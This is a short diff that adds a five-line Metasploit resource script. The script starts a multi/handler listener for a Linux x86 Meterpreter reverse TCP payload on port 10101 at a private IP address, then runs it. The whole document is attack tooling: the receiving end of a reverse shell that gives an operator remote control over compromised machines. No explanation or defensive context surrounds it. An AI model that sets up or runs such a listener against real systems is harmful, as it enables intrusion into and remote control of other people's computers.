@@ -1,0 +1,5 @@
+use multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set lport 10101
+set lhost 10.4.73.73
+run
